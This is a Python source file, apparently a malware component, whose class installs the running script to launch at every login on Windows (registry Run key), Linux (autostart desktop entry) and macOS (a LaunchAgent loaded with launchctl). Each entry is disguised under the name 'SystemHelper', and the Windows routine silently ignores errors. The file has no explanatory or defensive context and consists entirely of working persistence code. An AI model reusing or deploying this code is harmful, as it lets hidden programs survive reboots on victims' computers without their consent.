import os
import sys
import platform

class Persistence:
    @staticmethod
    def add_to_startup():
        system = platform.system()
        if system == "Windows":
            Persistence._windows_startup()
        elif system == "Linux":
            Persistence._linux_startup()
        elif system == "Darwin":
            Persistence._mac_startup()

    @staticmethod
    def _windows_startup():
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(sys.argv[0]))
            winreg.CloseKey(key)
        except Exception:
            pass

    @staticmethod
    def _linux_startup():
        autostart_dir = os.path.expanduser("~/.config/autostart")
        if not os.path.exists(autostart_dir):
            os.makedirs(autostart_dir)
        desktop_file = os.path.join(autostart_dir, "systemhelper.desktop")
        content = f"""[Desktop Entry]
Type=Application
Name=System Helper
Exec={sys.executable} {os.path.abspath(sys.argv[0])}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
        with open(desktop_file, 'w') as f:
            f.write(content)

    @staticmethod
    def _mac_startup():
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.systemhelper.plist")
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.systemhelper</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(sys.argv[0])}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        with open(plist_path, 'w') as f:
            f.write(plist_content)
        os.system(f"launchctl load {plist_path}")